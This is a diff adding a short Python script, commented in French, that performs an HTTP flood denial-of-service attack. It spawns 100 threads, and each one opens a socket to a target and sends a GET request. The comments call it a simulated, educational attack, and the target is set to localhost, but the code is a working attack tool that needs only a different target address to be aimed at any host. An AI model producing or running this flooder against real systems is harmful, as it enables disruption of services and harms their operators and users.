@@ -1,0 +1,30 @@
+import socket
+import threading
+
+def http_flood(target_ip, target_port, num_threads):
+    print(f"Lancement d'une attaque HTTP flood sur {target_ip}:{target_port}...")
+    for _ in range(num_threads):
+        thread = threading.Thread(target=send_http_request, args=(target_ip, target_port))
+        thread.start()
+
+def send_http_request(target_ip, target_port):
+    try:
+        # Créer un socket TCP
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Se connecter à la cible
+        sock.connect((target_ip, target_port))
+        # Envoyer une requête HTTP GET
+        request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
+        sock.send(request.encode())
+        # Fermer la connexion
+        sock.close()
+    except Exception as e:
+        print(f"Erreur lors de l'envoi de la requête HTTP: {e}")
+
+# Paramètres de l'attaque simulée (à des fins éducatives uniquement)
+target_ip = "127.0.0.1"  # Adresse IP de la cible (localhost dans cet exemple)
+target_port = 80         # Port de la cible (HTTP)
+num_threads = 100        # Nombre de threads pour simuler une attaque
+
+# Lancer l'attaque simulée
+http_flood(target_ip, target_port, num_threads)
